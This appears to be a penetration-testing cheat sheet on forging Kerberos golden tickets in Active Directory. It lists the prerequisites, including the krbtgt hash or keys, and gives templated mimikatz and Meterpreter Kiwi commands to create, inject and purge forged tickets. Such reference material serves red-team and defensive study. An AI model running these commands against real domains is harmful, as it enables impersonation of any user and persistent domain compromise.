# Active Directory - Golden Tickets

### Overview

`golden tickets` are Kerberos `Ticket-Granting Ticket (TGT)` forged with
arbitrary data. Indeed, the specified username, groups RID and SIDs will be
added to the forged ticket `Privilege Attribute Certificate (PAC)`. The
`golden ticket` can be injected in the current user session and used to request
`service tickets` from the `Ticket-Granting Service (TGS)`.

To generate a `golden ticket`, the following prerequisites are needed:
  - The fully qualified domain name and the `SID` of the targeted domain.
  - One of the secrets of the targeted domain `krbtgt` account. The `krbtgt`
  `RC4` key, corresponding to the `NTLM hash` of the `krbtgt` password, as
  well as the `AES 128/256 bits` keys can be used.

Note that while the user account specified for the `golden ticket` must be a
member of the targeted domain, the arbitrary SIDs added in the SID history of
the forged ticket (`ExtraSids` field of the `PAC`) can come from external
domains or forests (for which trusts relationships are configured).

### Generate golden tickets

###### mimikatz

The `mimikatz` `kerberos::golden` module can be used to generate
`golden tickets`:

```
# Powershell RATS
Get-ADDomain | Ft DNSRoot, DomainSID

mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> </rc4:<KRBTGT_NTLM> | /aes128:<KRBTGT_AES128> | /aes256:<KRBTGT_AES256>> [/groups:<RID | RID_LIST>] [/sids:<EXTRA_SID | EXTRA_SID_LIST>]
```

###### mimikatz with Metasploit

`mimikatz` 2.0 is available in a `meterpreter` shell as the `Kiwi` extension.

To following command can be used to load the extension in memory on a
`meterpreter` shell: `use kiwi`

Once the module has been loaded, the `golden_ticket_create` command can be
used to create a golden ticket:

```
golden_ticket_create -d '<FQDN_DOMAIN>' -s '<SID_DOMAIN>' -k '<KRBTGT_HASH>' -u '<USERNAME>' -t '<FULL_SAVE_PATH>'

Usage: golden_ticket_create [options]
OPTIONS:
    -d <opt>  FQDN of the target domain (required)
    -g <opt>  Comma-separated list of group identifiers to include (eg: 501,502)
    -h        Help banner
    -i <opt>  ID of the user to associate the ticket with
    -k <opt>  krbtgt domain user NTLM hash
    -s <opt>  SID of the domain
    -t <opt>  Local path of the file to store the ticket in (required)
    -u <opt>  Name of the user to create the ticket for (required)
```

Tickets can be loaded/purged using the `kerberos_ticket_use` and
`kerberos_ticket_purge` commands:

```
kerberos_ticket_use <FULL_SAVE_PATH>
kerberos_ticket_purge
```

### Check cached service tickets

The `klist` built-in utility  can be used to list the currently cached kerberos
tickets for the present user session:

```
CMD> klist

Cached Tickets: (X)
...
```

On a `meterpreter` shell, the `kiwi` `kerberos_ticket_list` command can be used:

```
kerberos_ticket_list
```
